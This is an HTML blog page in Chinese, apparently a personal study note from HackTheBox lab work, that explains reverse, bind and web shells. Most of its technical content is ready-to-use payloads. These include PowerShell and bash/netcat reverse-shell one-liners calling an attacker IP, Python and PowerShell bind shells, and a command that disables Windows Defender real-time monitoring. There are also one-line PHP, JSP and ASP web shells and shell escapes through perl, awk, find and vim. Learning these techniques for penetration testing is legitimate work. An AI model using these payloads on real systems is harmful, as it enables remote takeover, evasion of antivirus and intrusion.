@@ -1,0 +1,431 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>关于shell的一些东西 | Ak4izZ&#39;s 滴博客儿</title>
+  <meta name="author" content="Ak4izZ">
+  
+  <meta name="description" content="不想遇到一些东西用过之后完全没有概念，然后就有了这个分类。"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="关于shell的一些东西"/>
+  <meta property="og:site_name" content="Ak4izZ&#39;s 滴博客儿"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Ak4izZ&#39;s 滴博客儿" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Ak4izZ&#39;s 滴博客儿</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 关于shell的一些东西</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>不想遇到一些东西用过之后完全没有概念，然后就有了这个分类。</p>
+<span id="more"></span>
+
+<h1 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h1><p>用到的俩工具</p>
+<p><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p>
+<aside> 💡 A shell is a program that provides a computer user with an interface to input instructions into the system and view text output (Bash, Zsh, cmd, and PowerShell, for example).
+
+<p>Every operating system has a shell, and to interact with it, we must use an application known as a <code>terminal emulator</code> . Here are some of the most common terminal emulators:</p>
+<table>
+<thead>
+<tr>
+<th>Terminal Emulator</th>
+<th>Operating System</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/microsoft/terminal">https://github.com/microsoft/terminal</a></td>
+<td>Windows</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://cmder.app/">https://cmder.app/</a></td>
+<td>Windows</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://www.putty.org/">https://www.putty.org/</a></td>
+<td>Windows</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://sw.kovidgoyal.net/kitty/">https://sw.kovidgoyal.net/kitty/</a></td>
+<td>Windows, Linux and MacOS</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/alacritty/alacritty">https://github.com/alacritty/alacritty</a></td>
+<td>Windows, Linux and MacOS</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://invisible-island.net/xterm/">https://invisible-island.net/xterm/</a></td>
+<td>Linux</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/GNOME_Terminal">https://en.wikipedia.org/wiki/GNOME_Terminal</a></td>
+<td>Linux</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/mate-desktop/mate-terminal">https://github.com/mate-desktop/mate-terminal</a></td>
+<td>Linux</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://konsole.kde.org/">https://konsole.kde.org/</a></td>
+<td>Linux</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Terminal_(macOS)">https://en.wikipedia.org/wiki/Terminal_(macOS)</a></td>
+<td>MacOS</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://iterm2.com/">https://iterm2.com/</a></td>
+<td>MacOS</td>
+</tr>
+</tbody></table>
+<h2 id="Types-of-Shells"><a href="#Types-of-Shells" class="headerlink" title="Types of Shells"></a>Types of Shells</h2><ul>
+<li>Reverse Shell</li>
+<li>Bind Shell</li>
+<li>Web Shell</li>
+</ul>
+<h2 id="ReverseShell"><a href="#ReverseShell" class="headerlink" title="ReverseShell"></a>ReverseShell</h2><p>需要在攻击机开启nc监听，然后再从目标机器运行revshell命令，对攻击机反向连接。</p>
+<p>很多命令可以在[Payload All The Things](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources&#x2F;Reverse Shell Cheatsheet.md)和<a target="_blank" rel="noopener" href="https://www.revshells.com/">Reverse Shell Generator</a>中找到。</p>
+<p><img src="/%E5%85%B3%E4%BA%8Eshell%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%9C%E8%A5%BF/revshell.png" alt="bindshell"></p>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><pre class="line-numbers language-none"><code class="language-none">powershell -nop -c &quot;$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.123&#39;,1337);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;
+powershell -nop -c &quot;$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.158&#39;,443);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;
+
+# powershell -nop -c 启动一个no profile 的pwsh，执行&quot;&quot;中的命令
+# $client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.158&#39;,443) 实例化一个TCPClient对象，连接到括号中的地址
+# [byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;这实际上是一个空字节流，将定向到等待连接的攻击框上的 TCP 侦听器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在开启了Windows Defender antivirus的情况下，这个命令可能会被阻止，这样需要使用管理员关闭掉它（真实场景下如何实现？）</p>
+<img src="/2023/04/16/%E5%85%B3%E4%BA%8Eshell%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%9C%E8%A5%BF/1.png" class title="Untitled">
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\\Users\\htb-student> <span class="token function">Set-MpPreference</span> <span class="token operator">-</span>DisableRealtimeMonitoring <span class="token boolean">$true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">cat</span> /tmp/f <span class="token operator">|</span> /bin/bash <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">10.10</span>.14.12 <span class="token number">7777</span> <span class="token operator">></span> /tmp/f
+
+<span class="token comment"># mkfifo --make a named pipe file at /tmp/f</span>
+<span class="token comment"># 第一个 | 将 /bin/bash 的标准输入和cat的标准输出连接，2>&amp;1将标准错误和标准输出重定向到下一个pipe</span>
+<span class="token comment"># 使用nc连接目标地址，监听端口，输出会重定向到/tmp/f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="BindShell"><a href="#BindShell" class="headerlink" title="BindShell"></a>BindShell</h2><img src="/2023/04/16/%E5%85%B3%E4%BA%8Eshell%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%9C%E8%A5%BF/bindshell.png" class title="bindshell">
+
+<p>在目标机上开启对0.0.0.0的监听，这样就能接收到来自各方的连接，然后再从攻击机上使用nc连接</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Target@server:~$ <span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span> <span class="token function">cat</span> /tmp/f <span class="token operator">|</span> /bin/bash <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">10.129</span>.41.200 <span class="token number">7777</span> <span class="token operator">></span> /tmp/f
+
+<span class="token comment"># client端连接</span>
+Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ <span class="token function">nc</span> <span class="token parameter variable">-nv</span> <span class="token number">10.129</span>.41.200 <span class="token number">7777</span>
+
+Target@server:~$
+python <span class="token parameter variable">-c</span> <span class="token string">'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'</span>
+powershell <span class="token parameter variable">-NoP</span> <span class="token parameter variable">-NonI</span> <span class="token parameter variable">-W</span> Hidden <span class="token parameter variable">-Exec</span> Bypass <span class="token parameter variable">-Command</span> <span class="token variable">$listener</span> <span class="token operator">=</span> <span class="token punctuation">[</span>System.Net.Sockets.TcpListener<span class="token punctuation">]</span><span class="token number">1234</span><span class="token punctuation">;</span> <span class="token variable">$listener</span>.start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token variable">$listener</span>.AcceptTcpClient<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> <span class="token operator">=</span> <span class="token variable">$client</span>.GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token variable">$bytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">..</span><span class="token number">65535</span><span class="token operator">|</span>%<span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> <span class="token parameter variable">-ne</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">(</span>New-Object <span class="token parameter variable">-TypeName</span> System.Text.ASCIIEncoding<span class="token punctuation">)</span>.GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span>,0, <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> <span class="token operator">=</span> <span class="token punctuation">(</span>iex <span class="token variable">$data</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> Out-String <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span> <span class="token operator">=</span> <span class="token variable">$sendback</span> + <span class="token string">"PS "</span> + <span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>.Path + <span class="token string">" "</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>text.encoding<span class="token punctuation">]</span>::ASCII<span class="token punctuation">)</span>.GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Write<span class="token punctuation">(</span><span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$client</span>.Close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="upgrading-TTY"><a href="#upgrading-TTY" class="headerlink" title="upgrading TTY"></a>upgrading TTY</h2><p>通常连接shell之后，为了得到完整交互的shell，还需要升级tty。参考<a target="_blank" rel="noopener" href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat">Upgrading Simple Shells to Fully Interactive TTYs - ropnop blog</a></p>
+<p>常用的办法就是先在连接上的shell上</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">Ak4izZ@htb<span class="token punctuation">[</span><span class="token operator">/</span>htb<span class="token punctuation">]</span>$ python <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后<code>ctrl+z</code></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ stty raw <span class="token parameter variable">-echo</span>
+Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ <span class="token function">fg</span>
+
+<span class="token punctuation">[</span>Enter<span class="token punctuation">]</span>
+<span class="token punctuation">[</span>Enter<span class="token punctuation">]</span>
+www-data@remotehost$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后可以统一一下尺寸和大小</p>
+<p>先查询一下本机shell的</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$TERM</span>
+
+xterm-256color
+
+Ak4izZ@htb<span class="token punctuation">[</span>/htb<span class="token punctuation">]</span>$ stty size
+
+<span class="token number">67</span> <span class="token number">318</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后将目标的shell也设为同样的</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@remotehost$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm-256color
+
+www-data@remotehost$ stty rows <span class="token number">67</span> columns <span class="token number">318</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><a target="_blank" rel="noopener" href="https://github.com/jbarcia/Web-Shells/tree/master/laudanum">https://github.com/jbarcia/Web-Shells/tree/master/laudanum</a></p>
+<p><code>web shell</code>是一个基于浏览器的 shell 会话，我们可以使用它来与 Web 服务器的底层操作系统进行交互。同样，要通过 web shell 获得远程代码执行，我们必须首先找到可以为我们提供文件上传功能的网站或 web 应用程序漏洞。</p>
+<p>最简单就是一句话木马</p>
+<p>php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>jsp</p>
+<pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token operator">&lt;</span><span class="token operator">%</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>asp</p>
+<pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token operator">&lt;</span><span class="token operator">%</span> eval <span class="token function">request</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="antak-webShell"><a href="#antak-webShell" class="headerlink" title="antak webShell"></a>antak webShell</h3><p>Antak 是 Nishang 项目中包含的一个内置的 web shell <a target="_blank" rel="noopener" href="http://asp.net/">ASP.Net</a>。Nishang 是一个攻击性 PowerShell 工具集，可以为您的任何部分提供选项。antak文件可以在<code>/usr/share/nishang/Antak-Webshell</code>  文件夹中找到。Antak web shell 的功能类似于 Powershell console。但是，它将每个命令作为一个新进程执行。它还可以在内存中执行脚本并对发送的命令进行编码。作为一个 web shell，Antak 是一个非常强大的工具。</p>
+<h3 id="php-webShell"><a href="#php-webShell" class="headerlink" title="php webShell"></a>php webShell</h3><h1 id="执行shell"><a href="#执行shell" class="headerlink" title="执行shell"></a>执行shell</h1><p>perl</p>
+<pre class="line-numbers language-none"><code class="language-none">perl —e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;
+perl: exec &quot;&#x2F;bin&#x2F;sh&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>ruby</p>
+<pre class="line-numbers language-none"><code class="language-none">ruby: exec &quot;&#x2F;bin&#x2F;sh&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>lua</p>
+<pre class="line-numbers language-none"><code class="language-none">lua: os.execute(&#39;&#x2F;bin&#x2F;sh&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>awk</p>
+<pre class="line-numbers language-none"><code class="language-none">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>find</p>
+<pre class="line-numbers language-none"><code class="language-none">find &#x2F; -name nameoffile -exec &#x2F;bin&#x2F;awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39; \\;
+find . -exec &#x2F;bin&#x2F;sh \\; -quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>vim</p>
+<pre class="line-numbers language-none"><code class="language-none">vim -c &#39;:!&#x2F;bin&#x2F;sh&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>vim-escape</p>
+</aside>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/04/19/hack-wordpress/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/04/16/Linux磁盘扩容和挂载/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-04-16 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/一些零碎的知识/">一些零碎的知识<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 Ak4izZ's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
